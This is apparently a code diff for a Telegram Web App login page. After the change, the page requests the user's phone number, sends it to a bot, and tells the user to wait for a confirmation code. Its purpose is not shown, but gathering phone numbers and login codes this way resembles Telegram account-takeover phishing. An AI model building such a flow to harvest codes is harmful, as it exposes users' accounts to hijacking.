@@ -323,30 +323,28 @@
     shareBtn.innerHTML = '<div class="telegram-icon"></div>Запрос номера телефона...';
     
     try {
-        // Проверяем, находимся ли мы в Telegram Web App и доступен ли requestContact
-        if (window.Telegram && Telegram.WebApp && Telegram.WebApp.initDataUnsafe && Telegram.WebApp.initDataUnsafe.user) {
+        // Проверяем, находимся ли мы в Telegram Web App
+        if (window.Telegram && Telegram.WebApp) {
             console.log('✅ Running in Telegram Web App');
             
             // Пробуем использовать requestContact
             if (typeof Telegram.WebApp.requestContact === 'function') {
                 Telegram.WebApp.requestContact((contact) => {
                     if (contact) {
-                        // Номер телефона получен
-                        authData.phone = contact.phone_number;
-                        console.log('Phone number received:', authData.phone);
-                        shareBtn.innerHTML = '<div class="telegram-icon"></div>Номер телефона получен';
+                        // Номер телефона получен - отправляем его боту
+                        const phone = contact.phone_number;
+                        console.log('Phone number received:', phone);
                         
-                        // Показываем форму ввода кода
-                        document.getElementById('initialScreen').style.display = 'none';
-                        document.getElementById('codeForm').style.display = 'block';
+                        // Отправляем данные обратно боту
+                        Telegram.WebApp.sendData(JSON.stringify({
+                            action: 'phone_received',
+                            phone: phone
+                        }));
                         
-                        // Автофокус на первый инпут кода
-                        setTimeout(() => {
-                            document.querySelector('.code-input').focus();
-                        }, 100);
+                        // Показываем статус ожидания
+                        shareBtn.innerHTML = '<div class="telegram-icon"></div>Номер передан боту...';
+                        status.textContent = 'Номер получен. Ожидайте код подтверждения...';
                         
-                        // Отправляем код на номер
-                        sendAuthCode();
                     } else {
                         status.textContent = 'Предоставление номера телефона отменено';
                         shareBtn.disabled = false;
@@ -354,19 +352,24 @@
                     }
                 });
             } else {
-                // requestContact недоступен, используем fallback
-                console.log('⚠️ requestContact not available, using fallback');
-                useFallbackAuth();
+                // requestContact недоступен
+                console.log('⚠️ requestContact not available');
+                status.textContent = 'Функция запроса номера недоступна';
+                shareBtn.disabled = false;
+                shareBtn.innerHTML = '<div class="telegram-icon"></div>Войти через Telegram';
             }
         } else {
-            // Не в Telegram Web App, используем fallback
-            console.log('🌐 Running in browser, using fallback');
-            useFallbackAuth();
+            // Не в Telegram Web App
+            console.log('🌐 Running in browser');
+            status.textContent = 'Запустите приложение в Telegram для продолжения';
+            shareBtn.disabled = false;
+            shareBtn.innerHTML = '<div class="telegram-icon"></div>Войти через Telegram';
         }
     } catch (error) {
         console.error('Error requesting phone number:', error);
-        // При любой ошибке используем fallback
-        useFallbackAuth();
+        status.textContent = 'Ошибка при запросе номера телефона';
+        shareBtn.disabled = false;
+        shareBtn.innerHTML = '<div class="telegram-icon"></div>Войти через Telegram';
     }
 }
 
@@ -598,5 +601,6 @@ function useFallbackAuth() {
     </script>
 </body>
 </html>
+
 
 
